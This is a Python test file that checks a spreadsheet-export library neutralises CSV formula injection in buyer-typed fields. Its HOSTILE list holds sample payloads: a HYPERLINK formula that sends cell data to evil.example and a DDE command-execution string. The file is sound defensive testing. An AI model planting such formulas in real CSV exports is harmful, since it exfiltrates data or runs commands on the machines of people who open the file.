"""A working-file CSV opens in a spreadsheet, and a spreadsheet runs a cell that starts with = + - @ as a formula.

The company, site name and hall id in an intake are text a buyer typed (the checkout and the intake link accept them), and they reach
inputs.csv. The site registry's export already neutralised such cells; the engine's own bundle did not."""
import csv
import io
import json
from pathlib import Path

from gridforge.api.server import handle_study
from gridforge.api.tiers import Tier
from gridforge.serialize import _csv, _safe_cell

ROOT = Path(__file__).resolve().parent.parent
HOSTILE = ['=HYPERLINK("http://evil.example/?"&A1,"Open")', "=1+1", "+cmd|' /C calc'!A0", "@SUM(1+1)", "\t=1+1", "\r=1+1", "-2+3"]


def test_text_that_starts_a_formula_is_written_as_text():
    for h in HOSTILE:
        assert _safe_cell(h) == "'" + h, h


def test_numbers_and_ordinary_text_are_untouched():
    for v in (0, -1.5, 3, 2.0e9, True, None, "ordinary", "-1.5", "+5", "1e3", "", "a=b", "-", "+"):
        assert _safe_cell(v) == v, repr(v)


def test_a_csv_has_no_cell_that_starts_a_formula():
    out = _csv(["a", "b"], [[h, "x"] for h in HOSTILE] + [["-1.5", 2]])
    for row in csv.reader(io.StringIO(out)):
        for cell in row:
            assert not (cell[:1] in ("=", "+", "@", "\t", "\r") or (cell[:1] == "-" and not _is_number(cell))), cell


def _is_number(s):
    try:
        float(s)
        return True
    except ValueError:
        return False


def test_a_hostile_client_and_hall_label_do_not_reach_the_study_csv_bundle_as_formulas():
    doc = json.loads((ROOT / "examples" / "intake" / "dublin_hall.json").read_text())
    doc["project"] = {**doc.get("project", {}), "client": HOSTILE[0], "reference": "R-1", "objective": "max_compute"}
    doc["site"]["name"] = HOSTILE[2]
    out = handle_study({"intake": doc, "format": "csv"}, Tier.CLIENT)
    files = out.get("files") or out.get("csv") or {}
    assert files, f"no CSV files in the response: {list(out)}"
    for name, text in (files.items() if isinstance(files, dict) else files):
        if not name.endswith(".csv"):
            continue  # README.txt is prose with a banner line, not a spreadsheet
        for row in csv.reader(io.StringIO(text)):
            for cell in row:
                assert not cell.startswith(("=", "+", "@", "\t", "\r")), (name, cell)
